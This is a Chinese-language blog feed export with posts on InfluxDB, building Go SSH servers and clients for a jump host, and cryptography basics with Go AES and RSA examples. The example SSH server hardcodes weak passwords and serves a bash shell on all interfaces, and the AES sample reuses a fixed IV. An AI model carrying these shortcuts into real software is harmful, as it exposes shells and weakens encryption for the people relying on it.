7.63233333333333252015-08-18T00:36:00Z 7.2386666666666672015-08-18T00:54:00Z 6.982&gt; SELECT MAX("water_level") FROM "h2o_feet" WHERE time &gt;= '2015-08-18T00:00:00Z' AND time &lt; '2015-08-18T00:54:00Z' GROUP BY time(12m), "location"name: h2o_feettags: location = coyote_creektime max---- ---2015-08-18T00:00:00Z 8.122015-08-18T00:12:00Z 7.8872015-08-18T00:24:00Z 7.6352015-08-18T00:36:00Z 7.3722015-08-18T00:48:00Z 7.11name: h2o_feettags: location = santa_monicatime max---- ---2015-08-18T00:00:00Z 2.1162015-08-18T00:12:00Z 2.1262015-08-18T00:24:00Z 2.0512015-08-18T00:36:00Z 2.0672015-08-18T00:48:00Z 1.991 用户认证和权限Retention PolicyCotinuous Query常见操作(SQL)性能建议官方有很详解的说明,我这里仅截取出单节点部分:官方推荐硬件配置 Load Field writes per second MOderate queries per second Unique series Low &lt; 5 thousand &lt; 5 &lt; 100 thousand Moderate &lt; 250 thousand &lt; 25 &lt; 1 million High &gt; 250 &gt; 25 &gt; 1 million Probobly infeasible &gt; 750 thousand &gt; 100 &gt; 10 million 根据负载情况官方推荐的硬件需求: Load CPU RAM IOPS Low 2-4 cores 2-4 G 500 Moderate 4-6 cores 8-32 G 500-1000 High 8 cores 32+ G 1000+]]></content>
      <categories>
        <category>数据库</category>
        <category>时序数据库</category>
      </categories>
      <tags>
        <tag>influxdb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跳板机系列(四)-Golang中SSH服务端的实现]]></title>
    <url>%2F2017%2F02%2F23%2Fgo-ssh-server%2F</url>
    <content type="text"><![CDATA[上篇博客介绍了如何亲手实现一个SSH的客户端, 这篇博客将介绍如何使用golang的SSH包构建一个自己的SSH Server, 这样我们基本就能比较全面的了解的SSH的实现。为我们编写一个SSH Proxy奠定基石。 简介 以上是SSH协议一个基本架构图, 关于SSH协议的简介可以参考跳板机系列(二)-ssh协议原理简介, 只有在了解了SSH协议相关的基础上,才能理解SSH包里面的参数。对照着SSH协议, 将上面的架构图做简要解读: TCP: 建立传输层链接, 然后进行SSH协议处理 Handshake: 建立SSH协议里面的传输层[SSH-TRANS,该层主要提供加密传输 Authentication: SSH协议里面的用户认证层[SSH-USERAUTH], 提供用户认证 Channel和Request: 这些都是SSH协议里面的链接层[SSH-CONNECT], 该层主要是将多个加密隧道分成逻辑通道, 可以复用通道,通道有比较多的类型：session、x11、forwarded-tcpip、direct-tcpip, 通道里面的Requests是用于接收创建ssh channle的请求的, 而ssh channle就是里面的connection, 数据的交互基于connection交互。 Server配置 首先, 我们需要创建一个SSH Server的配置, 这里主要是配置认证, 作为一个SSH Server默认是应该支持2认证: 密钥认证和密码认证, 为了方便我仅实现密码认证。实现密码认证的核心是实现Server Config对象里面的PasswordCallback的函数, 该函数的核心是返回一个ssh.Permissions对象, 该对象保持了User认证通过的信息。这里为了方便, 并没有将认证系统和PAM对接, 而是直接简单的实现了一个用户名密码比较。这也是很核心的一个点, 基于此 我们在设计跳板机的时候, 可以实现Server端的统一认证, 在这里插入统一认证的代码。 12345678config := &amp;ssh.ServerConfig&#123; PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) &#123; if c.User() == "root" &amp;&amp; string(pass) == "admin" &#123; return nil, nil &#125; return nil, fmt.Errorf("password rejected for %q", c.User()) &#125;,&#125; 其次, 我们需要配置SSH Server的私钥, 需要保证私钥的安全, 因为他用于进行秘钥交换算法的关键(DH)1234567891011privateBytes, err := ioutil.ReadFile("id_rsa")if err != nil &#123; log.Fatal("Failed to load private key (./id_rsa)")&#125;private, err := ssh.ParsePrivateKey(privateBytes)if err != nil &#123; log.Fatal("Failed to parse private key")&#125;config.AddHostKey(private) 建立SSH通道(SSH链接层) SSH Server配置完成后, 首先得建立TCP链接123456789101112listener, err := net.Listen("tcp", "0.0.0.0:2200")if err != nil &#123; log.Fatalf("Failed to listen on 2200 (%s)", err)&#125;log.Print("Listening on 2200...")for &#123; conn, err := listener.Accept() if err != nil &#123; log.Printf("Failed to accept incoming connection (%s)", err) continue &#125; 然后我们通过ssh.NewServerConn来升级TCP链接为SSH链接, ssh提供的这个函数根据之前的配置完成: 1. 传输层[SSH-TRANS] 2. 认证层[SSH-USERAUTH] 3. 返回链接层的通道: incomingChannels, 接下来我们需要在Goroutine里面处理这些用户的通道。1234567891011 sshConn, chans, reqs, err := ssh.NewServerConn(conn, config) if err != nil &#123; log.Printf("Failed to handshake (%s)", err) continue &#125; // Discard all global out-of-band Requests go ssh.DiscardRequests(reqs) // Accept all channels go handleChannels(chans)&#125; 这样我们就已经完成了SSH Server的连接的监听 为了不阻塞通道的处理, 我们将每一个通道的处理都放到Goroutine里面进行12345func handleChannels(chans &lt;-chan ssh.NewChannel) &#123; for newChannel := range chans &#123; go handleChannel(newChannel) &#125;&#125; 在处理ssh channel里面的数据之前, 我们需要知道channel的类型, 因为不同类型的channel里面是不同类型的数据, 处理逻辑也不一样具体见rfc4250的4.9.1, 里面有比较详解的解释, 我们先不实现其他的,仅实现处理session类型channel。上面提到了通道有4种类型, 每种类型都有不同的用途,这里我们仅实现session类型通道的处理。123456func handleChannel(newChannel ssh.NewChannel) &#123; if t := newChannel.ChannelType(); t != "session" &#123; newChannel.Reject(ssh.UnknownChannelType, "unknown channel type") return &#125;&#125; 建立SSH Channel(回话交互) 通道提供一个Accept方法, 该方法返回2个queue, 1个用于数据交换(架构图里面的connection), 1个用于控制指令的交互,比如创建connection queue(架构图里面的requests)12345connection, requests, err := newChannel.Accept()if err != nil &#123; log.Printf("Could not accept channel (%s)", err) return&#125; 数据交互我们将运行bash程序,然后bash与 ssh channel对接, 从而实现和bash的远程交互, 从这里可以看出, 其实这里可以扩展性很高, 我们如果运行其他服务比如git,那么git也可通过ssh链接来交互。 git也正是通过这种方式支持ssh的。这里准备了一个colse函数用于关闭ssh channel和退出bash程序1234567891011bash := exec.Command("bash")// Prepare teardown functionclose := func() &#123; _, err := bash.Process.Wait() if err != nil &#123; log.Printf("Failed to exit bash (%s)", err) &#125; connection.Close() log.Printf("Session closed")&#125; 如果我们直接将bash的输入和输出流行terminal这将失败, 因为bash没有运行在tty中, 因此这里需要一个模拟tty(pty)来运行bash。123456bashf, err := pty.Start(bash)if err != nil &#123; log.Printf("Could not start pty (%s)", err) close() return&#125; 接下来我们需要将 bash的管道和connection的管道对接起来, 这里为了保证colse函数(connection资源释放)只被调用一次使用的sync.Once。123456789var once sync.Oncego func() &#123; io.Copy(connection, bashf) once.Do(close)&#125;()go func() &#123; io.Copy(bashf, connection) once.Do(close)&#125;() 指令交互这里主要有以下几类请求: shell/exec/subsystem: channel request type for shell, 这几类主要是用于区分connection链接的程序, shell值后面启动的一个程序或者shell, exec指后面启动的是用户的默认shell, 而subsystem是在后面启动一个子程序来执行connection里面的命令 pty-req: 准备一个pty等待输入 window-change: 监听tty窗口改变事件。及时更新tty size。123456789101112131415161718192021 go func() &#123; for req := range requests &#123; switch req.Type &#123; case "shell": // We only accept the default shell // (i.e. no command in the Payload) if len(req.Payload) == 0 &#123; req.Reply(true, nil) &#125; case "pty-req": termLen := req.Payload[3] w, h := parseDims(req.Payload[termLen+4:]) SetWinsize(bashf.Fd(), w, h) req.Reply(true, nil) case "window-change": w, h := parseDims(req.Payload) SetWinsize(bashf.Fd(), w, h) &#125; &#125; &#125;()&#125; 完整代码以下是完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184package mainimport ( "encoding/binary" "fmt" "io" "io/ioutil" "log" "net" "os/exec" "sync" "syscall" "unsafe" "github.com/kr/pty" "golang.org/x/crypto/ssh")func main() &#123; // In the latest version of crypto/ssh (after Go 1.3), the SSH server type has been removed // in favour of an SSH connection type. A ssh.ServerConn is created by passing an existing // net.Conn and a ssh.ServerConfig to ssh.NewServerConn, in effect, upgrading the net.Conn // into an ssh.ServerConn config := &amp;ssh.ServerConfig&#123; //Define a function to run when a client attempts a password login PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) &#123; // Should use constant-time compare (or better, salt+hash) in a production setting. if c.User() == "foo" &amp;&amp; string(pass) == "bar" &#123; return nil, nil &#125; return nil, fmt.Errorf("password rejected for %q", c.User()) &#125;, // You may also explicitly allow anonymous client authentication, though anon bash // sessions may not be a wise idea // NoClientAuth: true, &#125; // You can generate a keypair with 'ssh-keygen -t rsa' privateBytes, err := ioutil.ReadFile("id_rsa") if err != nil &#123; log.Fatal("Failed to load private key (./id_rsa)") &#125; private, err := ssh.ParsePrivateKey(privateBytes) if err != nil &#123; log.Fatal("Failed to parse private key") &#125; config.AddHostKey(private) // Once a ServerConfig has been configured, connections can be accepted. listener, err := net.Listen("tcp", "0.0.0.0:2200") if err != nil &#123; log.Fatalf("Failed to listen on 2200 (%s)", err) &#125; // Accept all connections log.Print("Listening on 2200...") for &#123; tcpConn, err := listener.Accept() if err != nil &#123; log.Printf("Failed to accept incoming connection (%s)", err) continue &#125; // Before use, a handshake must be performed on the incoming net.Conn. sshConn, chans, reqs, err := ssh.NewServerConn(tcpConn, config) if err != nil &#123; log.Printf("Failed to handshake (%s)", err) continue &#125; log.Printf("New SSH connection from %s (%s)", sshConn.RemoteAddr(), sshConn.ClientVersion()) // Discard all global out-of-band Requests go ssh.DiscardRequests(reqs) // Accept all channels go handleChannels(chans) &#125;&#125;func handleChannels(chans &lt;-chan ssh.NewChannel) &#123; // Service the incoming Channel channel in go routine for newChannel := range chans &#123; go handleChannel(newChannel) &#125;&#125;func handleChannel(newChannel ssh.NewChannel) &#123; // Since we're handling a shell, we expect a // channel type of "session". The also describes // "x11", "direct-tcpip" and "forwarded-tcpip" // channel types. if t := newChannel.ChannelType(); t != "session" &#123; newChannel.Reject(ssh.UnknownChannelType, fmt.Sprintf("unknown channel type: %s", t)) return &#125; // At this point, we have the opportunity to reject the client's // request for another logical connection connection, requests, err := newChannel.Accept() if err != nil &#123; log.Printf("Could not accept channel (%s)", err) return &#125; // Fire up bash for this session bash := exec.Command("bash") // Prepare teardown function close := func() &#123; connection.Close() _, err := bash.Process.Wait() if err != nil &#123; log.Printf("Failed to exit bash (%s)", err) &#125; log.Printf("Session closed") &#125; // Allocate a terminal for this channel log.Print("Creating pty...") bashf, err := pty.Start(bash) if err != nil &#123; log.Printf("Could not start pty (%s)", err) close() return &#125; //pipe session to bash and visa-versa var once sync.Once go func() &#123; io.Copy(connection, bashf) once.Do(close) &#125;() go func() &#123; io.Copy(bashf, connection) once.Do(close) &#125;() // Sessions have out-of-band requests such as "shell", "pty-req" and "env" go func() &#123; for req := range requests &#123; switch req.Type &#123; case "shell": // We only accept the default shell // (i.e. no command in the Payload) if len(req.Payload) == 0 &#123; req.Reply(true, nil) &#125; case "pty-req": termLen := req.Payload[3] w, h := parseDims(req.Payload[termLen+4:]) SetWinsize(bashf.Fd(), w, h) // Responding true (OK) here will let the client // know we have a pty ready for input req.Reply(true, nil) case "window-change": w, h := parseDims(req.Payload) SetWinsize(bashf.Fd(), w, h) &#125; &#125; &#125;()&#125;// parseDims extracts terminal dimensions (width x height) from the provided buffer.func parseDims(b []byte) (uint32, uint32) &#123; w := binary.BigEndian.Uint32(b) h := binary.BigEndian.Uint32(b[4:]) return w, h&#125;// Winsize stores the Height and Width of a terminal.type Winsize struct &#123; Height uint16 Width uint16 x uint16 // unused y uint16 // unused&#125;// SetWinsize sets the size of the given pty.func SetWinsize(fd uintptr, w, h uint32) &#123; ws := &amp;Winsize&#123;Width: uint16(w), Height: uint16(h)&#125; syscall.Syscall(syscall.SYS_IOCTL, fd, uintptr(syscall.TIOCSWINSZ), uintptr(unsafe.Pointer(ws)))&#125;]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>ssh-jumphost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跳板机系列(三)-Golang中SSH客户端的实现]]></title>
    <url>%2F2017%2F02%2F22%2Fssh-protocol-go%2F</url>
    <content type="text"><![CDATA[上面几篇博客已经介绍过加密算法和ssh协议的构成, 这篇博客主要将介绍golang中ssh库的一些具体使用,为后面写ssh的跳板机做铺垫。 栗子先上2个栗子, 后面会对此做详细介绍Shell交互模式1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253 package mainimport ( "log" "os" "golang.org/x/crypto/ssh" "golang.org/x/crypto/ssh/terminal")func main() &#123; ce := func(err error, msg string) &#123; if err != nil &#123; log.Fatalf("%s error: %v", msg, err) &#125; &#125; client, err := ssh.Dial("tcp", "localhost:1234", &amp;ssh.ClientConfig&#123; User: "root", Auth: []ssh.AuthMethod&#123;ssh.Password("xxx")&#125;, &#125;) ce(err, "dial") session, err := client.NewSession() ce(err, "new session") defer session.Close() session.Stdout = os.Stdout session.Stderr = os.Stderr session.Stdin = os.Stdin modes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400, &#125; termFD := int(os.Stdin.Fd()) w, h, _ := terminal.GetSize(termFD) termState, _ := terminal.MakeRaw(termFD) defer terminal.Restore(termFD, termState) err = session.RequestPty("xterm-256color", h, w, modes) ce(err, "request pty") err = session.Shell() ce(err, "start shell") err = session.Wait() ce(err, "return")&#125; 远程命令模式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package mainimport ( "bytes" "fmt" "log" "golang.org/x/crypto/ssh")func main() &#123; ce := func(err error, msg string) &#123; if err != nil &#123; log.Fatalf("%s error: %v", msg, err) &#125; &#125; client, err := ssh.Dial("tcp", "localhost:1234", &amp;ssh.ClientConfig&#123; User: "root", Auth: []ssh.AuthMethod&#123;ssh.Password("xxx")&#125;, &#125;) ce(err, "dial") session, err := client.NewSession() ce(err, "new session") defer session.Close() modes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400, &#125; err = session.RequestPty("xterm-256color", 80, 40, modes) ce(err, "request pty") if err := session.Setenv("LC_USR_DIR", "/usr"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; var b bytes.Buffer session.Stdout, session.Stderr = &amp;b, &amp;b if err := session.Run("ls -l $LC_USR_DIR"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; fmt.Println(b.String())&#125; 简介SSH(Secure Shell)是一个提供数据通信安全、远程登录、远程指令执行等功能的安全网络协议, 具体可以查阅我的上一篇博客跳板机系列(二)-ssh协议原理简介但是golang的ssh包并不在golang的标准库中, 在: godoc.org/golang.org/x/crypto/ssh中, 所以需要翻墙才能下到。golang的这个ssh包同时实现了ssh的客户端和server端, 也许你也经常看到一个ssh-agent的东西, 也在这个包括, 但我不将他归纳在client和server里面, 因为ssh-agent是一个用于保存私钥的程序, 在数字签名验证时(RSA, DSA, ECDSA, Ed25519)提供身份认证, 它就是一个帮助我们验证身份的程序。接下来主要讲ssh clent, 但是还是会涉及到一点ssh-agent的部分。 认证要使用ssh的客户端, 那么认证就比较关键了, ssh提供2种认证方式: 用户名密码认证和密钥认证。通过ssh提供的一个config对象, 我们可以配置ssh使用的认证方式. 而配置对象里面关于认证的配置使用的是ssh.AuthMethod接口, ssh.AuthMethod是auth的总接口(存储实现了auth 和 method的对象), AuthMethod呈现的是一个实现了RFC4252认证方法的实例。 用户名密码认证认证方式如果使用Password方式的话 那么可以使用ssh.Password方法获取一个AuthMethod接口对象。123456sshConfig := &amp;ssh.ClientConfig&#123; User: "your_user_name", Auth: []ssh.AuthMethod&#123; ssh.Password("your_password") &#125;,&#125; 密钥认证前提: 密钥认证的本质是使用非对称加密的数字签名功能, 所以必须将你的公共密钥填充到一个远程机器上的authorized_keys文件中 你可以手动完成, 也可以使用ssh-copy-id这个命令来帮你完成。在公钥推送ok过后, 使用秘钥认证, 这里有两种方式可以获取用户的私钥, 用于签名算法时做身份认证: 从秘钥文件中读取和ssh-agent中读取。 私钥文件读取私钥文件, 然后使用ssh.PublicKeys方法 获取一个AuthMethod接口对象, 这里我再次封装了下, 通过PublicKeyFile可以直接获取一个公钥的AuthMethod接口。12345678910111213141516171819func PublicKeyFile(file string) ssh.AuthMethod &#123; buffer, err := ioutil.ReadFile(file) if err != nil &#123; return nil &#125; key, err := ssh.ParsePrivateKey(buffer) if err != nil &#123; return nil &#125; return ssh.PublicKeys(key)&#125;sshConfig := &amp;ssh.ClientConfig&#123; User: "your_user_name", Auth: []ssh.AuthMethod&#123; PublicKeyFile("/path/to/your/pub/certificate/key") &#125;,&#125; SSH AgentSSH Agent 是一个*nix系统里面的工具, 他将用户私钥保存在一张加密的表中, 为了避免命令行的参数传入, 很多用户还是愿意将他们的秘钥交给ssh agent管理。为了能获取到你存储在ssh agent中的私钥, 你首先的将你的私钥提交给ssh agent保管,执行如下命令:1$ ssh-add /path/to/your/private/certificate/file 我们可以通过socket(net.Dial)访问到里面存储的私钥, 然后使用工厂函数ssh.PublicKeysCallback来创建一个ssh agent的AuthMethod实例。12345678910111213func SSHAgent() ssh.AuthMethod &#123; if sshAgent, err := net.Dial("unix", os.Getenv("SSH_AUTH_SOCK")); err == nil &#123; return ssh.PublicKeysCallback(agent.NewClient(sshAgent).Signers) &#125; return nil&#125;sshConfig := &amp;ssh.ClientConfig&#123; User: "your_user_name", Auth: []ssh.AuthMethod&#123; SSHAgent() &#125;,&#125; 建立链接当我们通过ssh.ClientConfig对象设置好ssh的配置过后, 我们就可以调用ssh.Dial方法来建立一个ssh连接了1234connection, err := ssh.Dial("tcp", "host:port", sshConfig)if err != nil &#123; return nil, fmt.Errorf("Failed to dial: %s", err)&#125; 创建回话与交换当ssh连接建立过后, 我们就可以通过这个连接建立一个回话, 在回话上和远程主机通信。1234session, err := connection.NewSession()if err != nil &#123; return nil, fmt.Errorf("Failed to create session: %s", err)&#125; 但是通信之前我们需要请求在远程主机上创建一个伪终端(pty全称pseudo terminal), 简单说来pty是一对字符设备, 提供一个双向沟通的渠道，大概过程是这样(pty master &lt;—session—&gt; pty slave), 关于对pty的更详尽的介绍可以参考TTY的那些事儿12345678910modes := ssh.TerminalModes&#123; ssh.ECHO: 0, // disable echoing ssh.TTY_OP_ISPEED: 14400, // input speed = 14.4kbaud ssh.TTY_OP_OSPEED: 14400, // output speed = 14.4kbaud&#125;if err := session.RequestPty("xterm", 80, 40, modes); err != nil &#123; session.Close() return nil, fmt.Errorf("request for pseudo terminal failed: %s", err)&#125; 远程主机开启pty终端过后, 我们就可以直接通过Run发送命令了, 这里我们通过Setenv设置session的环境变量, session执行的结果通过Stdout, Stderr返回, 这里使用一个Buffer来保存这些结果。123456789if err := session.Setenv("LC_USR_DIR", "/usr"); err != nil &#123; panic("Failed to run: " + err.Error())&#125;var b bytes.Buffersession.Stdout, session.Stderr = &amp;b, &amp;bif err := session.Run("ls -l $LC_USR_DIR"); err != nil &#123; panic("Failed to run: " + err.Error())&#125; 如果我们使用Shell模式的话, 我们需要在ptmx上创建一个terminal, 这样对他的操作才会反应到pts上 ,大概的原理是这样: ssh&lt;---&gt;/dev/ptmx(master)&lt;---&gt;pts/*(slave)&lt;---&gt;getty为了说清楚原理, 我引用了别人的话,希望能方便你理解: 如果某人在网上使用telnet程序连接到你的计算机上，则telnet程序就可能会打开/dev/ptmx设备获取一个fd。此时一个getty程序就应该运行在对应的/dev/pts/上。当telnet从远端获取了一个字符时，该字符就会通过ptmx、pts/传递给 getty程序，而getty程序就会通过pts/*、ptmx和telnet程序往网络上返回“login:”字符串信息。这样，登录程序与telnet程序就通过伪终端进行通信。 123456789101112131415161718session.Stdout = os.Stdoutsession.Stderr = os.Stderrsession.Stdin = os.Stdinmodes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400,&#125;termFD := int(os.Stdin.Fd())w, h, _ := terminal.GetSize(termFD)termState, _ := terminal.MakeRaw(termFD)defer terminal.Restore(termFD, termState)err = session.RequestPty("xterm-256color", h, w, modes)ce(err, "request pty") 总结其实TTY是一个很大很经典的话题, 后面做Web Terminal时, 还得使用xterm这种类型的pty, 由于篇幅有限, 没有展开, 以后补上。]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>ssh-jumphost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码学简介与Golang的加密库Crypto的使用]]></title>
    <url>%2F2017%2F02%2F19%2Fgo-crypto%2F</url>
    <content type="text"><![CDATA[据记载，公元前400年，古希腊人发明了置换密码。1881年世界上的第一个电话保密专利出现。在第二次世界大战期间，德国军方启用“恩尼格玛”密码机，密码学在战争中起着非常重要的作用, 这段历史很有趣,建议看看恩格玛机破解历史。随着信息化和数字化社会的发展，人们对信息安全和保密的重要性认识不断提高，于是在1997年，美国国家标准局公布实施了“美国数据加密标准（DES）”，民间力量开始全面介入密码学的研究和应用中，采用的加密算法有DES、RSA、SHA等。随着对加密强度需求的不断提高，近期又出现了AES、ECC等。 密码学的目的 保密性：防止用户的标识或数据被读取。 数据完整性：防止数据被更改。 身份验证：确保数据发自特定的一方。 密码学的应用随着密码学商业应用的普及，公钥密码学受到前所未有的重视。除传统的密码应用系统外，PKI系统以公钥密码技术为主，提供加密、签名、认证、密钥管理、分配等功能。 保密通信：保密通信是密码学产生的动因。使用公私钥密码体制进行保密通信时，信息接收者只有知道对应的密钥才可以解密该信息。 数字签名：数字签名技术可以代替传统的手写签名，而且从安全的角度考虑，数字签名具有很好的防伪造功能。在政府机关、军事领域、商业领域有广泛的应用环境。 秘密共享：秘密共享技术是指将一个秘密信息利用密码技术分拆成n个称为共享因子的信息，分发给n个成员，只有k(k≤n)个合法成员的共享因子才可以恢复该秘密信息，其中任何一个或m(m≤k)个成员合作都不知道该秘密信息。利用秘密共享技术可以控制任何需要多个人共同控制的秘密信息、命令等。 认证功能：在公开的信道上进行敏感信息的传输，采用签名技术实现对消息的真实性、完整性进行验证，通过验证公钥证书实现对通信主体的身份验证。 密钥管理：密钥是保密系统中更为脆弱而重要的环节，公钥密码体制是解决密钥管理工作的有力工具；利用公钥密码体制进行密钥协商和产生，保密通信双方不需要事先共享秘密信息；利用公钥密码体制进行密钥分发、保护、密钥托管、密钥恢复等。 加密算法介绍根据密钥类型不同将现代密码技术分为两类： 对称加密算法: 加密和解密均采用同一把秘密钥匙。 非对称加密算法: 有2把密钥,公钥和私钥, 公钥加密, 私钥解密。 对称加密算法对称加密算法用来对敏感数据等信息进行加密，常用的算法包括： DES(Data Encryption Standard): 数据加密标准，速度较快，适用于加密大量数据的场合。 3DES(Triple DES): 是基于DES，对一块数据用三个不同的密钥进行三次加密，强度更高。 AES(Advanced Encryption Standard): 高级加密标准，是下一代的加密算法标准，速度快，安全级别高； AES2000年10月，NIST(美国国家标准和技术协会)宣布通过从15种侯选算法中选出的一项新的密匙加密标准。Rijndael被选中成为将来的AES。 Rijndael是在1999年下半年，由研究员Joan Daemen和Vincent Rijmen创建的。AES正日益成为加密各种形式的电子数据的实际标准。并于2002年5月26日制定了新的高级加密标准 (AES) 规范。算法原理 AES算法基于排列和置换运算。排列是对数据重新进行安排，置换是将一个数据单元替换为另一个。AES 使用几种不同的方法来执行排列和置换运算。AES是一个迭代的、对称密钥分组的密码，它可以使用128、192 和 256 位密钥，并且用 128 位（16字节）分组加密和解密数据。与公共密钥密码使用密钥对不同，对称密钥密码使用相同的密钥加密和解密数据。通过分组密码返回的加密数据的位数与输入数据相同。迭代加密使用一个循环结构，在该循环中重复置换和替换输入数据。 DESDES全称为Data Encryption Standard，即数据加密标准，是一种使用密钥加密的块算法，1977年被美国联邦政府的国家标准局确定为联邦资料处理标准（FIPS），并授权在非密级政府通信中使用，随后该算法在国际上广泛流传开来。 AES与3DES的比较 算法名称 算法类型 密钥长度 速度 解密时间（建设机器每秒尝试255个密钥） 资源消耗 AES 对称block密码 128、192、256位 高 1490000亿年 低 3DES 对称feistel密码 112位或168位 低 46亿年 中 破解历史历史上有三次对DES有影响的攻击实验。1997年，利用当时各国 7万台计算机，历时96天破解了DES的密钥。1998年，电子边境基金会（EFF）用25万美元制造的专用计算机，用56小时破解了DES的密钥。1999年，EFF用22小时15分完成了破解工作。因此。曾经有过卓越贡献的DES也不能满足我们日益增长的需求了。 代码示例综上看来AES安全度最高, 基本现状就是AES已经替代DES成为新一代对称加密的标准, 下面是Golang中AES使用的栗子12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364package mainimport ( "crypto/aes" "crypto/cipher" "fmt")var commonIV = []byte&#123;0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f&#125;func encrypt(plainText string, keyText string) (cipherByte []byte, err error) &#123; // 转换成字节数据, 方便加密 plainByte := []byte(plainText) keyByte := []byte(keyText) // 创建加密算法aes c, err := aes.NewCipher(keyByte) if err != nil &#123; return nil, err &#125; //加密字符串 cfb := cipher.NewCFBEncrypter(c, commonIV) cipherByte = make([]byte, len(plainByte)) cfb.XORKeyStream(cipherByte, plainByte) return&#125;func decrypt(cipherByte []byte, keyText string) (plainText string, err error) &#123; // 转换成字节数据, 方便加密 keyByte := []byte(keyText) // 创建加密算法aes c, err := aes.NewCipher(keyByte) if err != nil &#123; return "", err &#125; // 解密字符串 cfbdec := cipher.NewCFBDecrypter(c, commonIV) plainByte := make([]byte, len(cipherByte)) cfbdec.XORKeyStream(plainByte, cipherByte) plainText = string(plainByte) return&#125;func main() &#123; plain := "The text need to be encrypt." // AES 规定有3种长度的key: 16, 24, 32分别对应AES-128, AES-192, or AES-256 key := "abcdefgehjhijkmlkjjwwoew" // 加密 cipherByte, err := encrypt(plain, key) if err != nil &#123; fmt.Println(err) &#125; fmt.Printf("%s ==&gt; %x\n", plain, cipherByte) // 解密 plainText, err := decrypt(cipherByte, key) if err != nil &#123; fmt.Println(err) &#125; fmt.Printf("%x ==&gt; %s\n", cipherByte, plainText)&#125; 非对称算法非对称加密算法常用于数据加密和身份认证, 常见的非对称加密算法如下： RSA: 由RSA公司发明，是一个支持变长密钥的公共密钥算法，需要加密的文件块的长度也是可变的； DSA(Digital Signature Algorithm): 数字签名算法，是一种标准的DSS(数字签名标准)； ECC(Elliptic Curves Cryptography): 椭圆曲线密码编码学。 ECDSA(Elliptic Curve Digital Signature Algorithm): 基于椭圆曲线的DSA签名算法 DSADSA是基于整数有限域离散对数难题的，其安全性与RSA相比差不多。DSA的一个重要特点是两个素数公开，这样，当使用别人的p和q时，即使不知道私钥，你也能确认它们是否是随机产生的，还是作了手脚。RSA算法却做不到但是其缺点就是只能用于数字签名, 不能用于加密。 RSA在1976年，由于对称加密算法已经不能满足需要，Diffie 和Hellman发表了一篇叫《密码学新动向》的文章，介绍了公匙加密的概念，由Rivet、Shamir、Adelman提出了RSA算法。RSA是目前最有影响力的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准。 ECCECC加密的原理依赖椭圆曲线上的难题。今天只有短的RSA钥匙才可能被强力方式解破。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。但在分布式计算和量子计算机理论日趋成熟的今天，RSA加密安全性受到了挑战。随着分解大整数方法的进步及完善、计算机速度的提高以及计算机网络的发展，为了保障数据的安全，RSA的密钥需要不断增加，但是，密钥长度的增加导致了其加解密的速度大为降低，硬件实现也变得越来越难以忍受，这对使用RSA的应用带来了很重的负担，因此需要一种新的算法来代替RSA。1985年N.Koblitz和Miller提出将椭圆曲线用于密码算法，根据是有限域上的椭圆曲线上的点群中的离散对数问题ECDLP。ECDLP是比因子分解问题更难的问题，它是指数级的难度。 ECDSA因为在数字签名的安全性高, 基于ECC的DSA更高, 所以非常适合数字签名使用场景, 在SSH TLS有广泛使用, ECC把离散对数安全性高很少, 所以ECC在安全领域会成为下一个标准。 ECC与RSA的比较ECC和RSA相比，在许多方面都有对绝对的优势，主要体现在以下方面： 抗攻击性强。相同的密钥长度，其抗攻击性要强很多倍。 计算量小，处理速度快。ECC总的速度比RSA、DSA要快得多。 存储空间占用小。ECC的密钥尺寸和系统参数与RSA、DSA相比要小得多，意味着它所占的存贮空间要小得多。这对于加密算法在IC卡上的应用具有特别重要的意义。 带宽要求低。当对长消息进行加解密时，三类密码系统有相同的带宽要求，但应用于短消息时ECC带宽要求却低得多。带宽要求低使ECC在无线网络领域具有广泛的应用前景。 ECC的这些特点使它必将取代RSA，成为通用的公钥加密算法。比如SET协议的制定者已把它作为下一代SET协议中缺省的公钥密码算法。ECC的这些特点使它必将取代RSA，成为通用的公钥加密算法。比如SET协议的制定者已把它作为下一代SET协议中缺省的公钥密码算法。 代码示例ECC是未来的一个趋势, 在IOT行业是一个不错的选择, 但是现在被广泛使用的依然是RSA以下使用RSA进行加解密: 使用对方的公钥加密数据, 然后发给对方, 对方使用自己的私钥解密.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495package mainimport ( "crypto/rand" "crypto/rsa" "crypto/sha1" "crypto/x509" "encoding/pem" "fmt")// 使用对方的公钥的数据, 只有对方的私钥才能解开func encrypt(plain string, publicKey string) (cipherByte []byte, err error) &#123; msg := []byte(plain) // 解码公钥 pubBlock, _ := pem.Decode([]byte(publicKey)) // 读取公钥 